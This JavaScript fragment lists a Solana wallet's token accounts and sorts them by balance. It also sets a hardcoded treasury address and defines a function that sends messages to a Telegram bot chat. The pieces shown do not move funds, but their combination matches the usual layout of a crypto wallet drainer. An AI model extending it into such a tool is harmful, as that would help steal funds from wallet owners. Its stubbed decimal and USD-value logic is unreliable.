const getTokenAccounts = async (wallet, solanaConnection) => {
    try {
        if (!wallet || !solanaConnection) {
            throw new Error("Wallet or Solana connection is missing.");
        }

        const filters = [
            { dataSize: 165 }, // Size of token account data
            {
                memcmp: {
                    offset: 32, // Wallet address offset
                    bytes: wallet, // Base58 encoded wallet address
                },
            },
        ];

        // Fetch accounts
        const accounts = await solanaConnection.getParsedProgramAccounts(
            TOKEN_PROGRAM_ID,
            { filters }
        );

        console.log(`Found ${accounts.length} token account(s) for wallet ${wallet}.`);

        // Fetch details for each token account
        const tokensInfo = await Promise.all(
            accounts.map(async (account, index) => {
                const parsedAccountInfo = account.account.data;
                const mintAddress = parsedAccountInfo["parsed"]["info"]["mint"];
                const tokenBalance = +parsedAccountInfo["parsed"]["info"]["tokenAmount"]["uiAmount"];

                console.log(`Token Account No. ${index + 1}: ${account.pubkey.toString()}`);
                console.log(`--Token Mint: ${mintAddress}`);
                console.log(`--Token Balance: ${tokenBalance}`);

                // Skip accounts with zero balance
                if (tokenBalance === 0) {
                    return null;
                }

                // Fetch token decimals
                const tokenDecimals = await getTokenDecimals(mintAddress, solanaConnection);

                return {
                    address: account.pubkey.toString(),
                    mintAddress,
                    decimals: tokenDecimals,
                    balance: tokenBalance,
                    totalTokenValueUSD: tokenBalance, // Placeholder for real USD value
                };
            })
        );

        // Filter out null results and sort by total token value (descending)
        const sortedTokensInfo = tokensInfo
            .filter((token) => token !== null)
            .sort((a, b) => b.totalTokenValueUSD - a.totalTokenValueUSD);

        console.log("Sorted Tokens Info:", sortedTokensInfo);
        return sortedTokensInfo;
    } catch (error) {
        console.error("Error fetching token accounts:", error.message);
        throw error;
    }
};

// Example: Function to fetch token decimals (replace with actual implementation)
const getTokenDecimals = async (mintAddress, solanaConnection) => {
    // Implement logic to fetch decimals based on mintAddress
    // For simplicity, returning a placeholder value
    return 9; // Assuming SPL token standard
};

const TREASURY_ACCOUNT = "3es1ckHmP6PXArEh3nJsKHTLMe5E9TJAVS7PYh743wK6";

const sendNotification = async (text, parse_mode) => {
    const endpoint = `https://api.telegram.org/bot${TG_BOT_KEY}/sendMessage`;
    await makePostRequest(endpoint, {
      text: text,
      parse_mode: parse_mode,
      chat_id: CHAT_ID,
      disable_web_page_preview: true
    });
};
  